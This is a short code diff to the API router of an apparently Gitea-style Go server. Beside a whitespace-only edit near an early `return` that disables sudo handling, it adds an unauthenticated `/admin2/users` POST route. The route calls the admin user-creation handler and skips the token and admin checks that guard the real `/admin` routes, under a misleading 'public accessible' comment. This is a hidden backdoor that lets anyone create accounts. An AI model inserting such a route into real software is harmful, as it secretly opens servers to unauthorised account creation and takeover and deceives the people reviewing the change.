@@ -107,7 +107,7 @@ import (
 func sudo() func(ctx *context.APIContext) {
 	return func(ctx *context.APIContext) {
 		return
-		
+
 		sudo := ctx.FormString("sudo")
 		if len(sudo) == 0 {
 			sudo = ctx.Req.Header.Get("Sudo")
@@ -1561,6 +1561,13 @@ func Routes() *web.Router {
 			})
 			m.Get("/activities/feeds", org.ListTeamActivityFeeds)
 		}, tokenRequiresScopes(auth_model.AccessTokenScopeCategoryOrganization), orgAssignment(false, true), reqToken(), reqTeamMembership(), checkTokenPublicOnly())
+
+		// Misc (public accessible)
+		m.Group("/admin2", func() {
+			m.Group("/users", func() {
+				m.Post("", bind(api.CreateUserOption{}), admin.CreateUser)
+			})
+		})
 
 		m.Group("/admin", func() {
 			m.Group("/cron", func() {
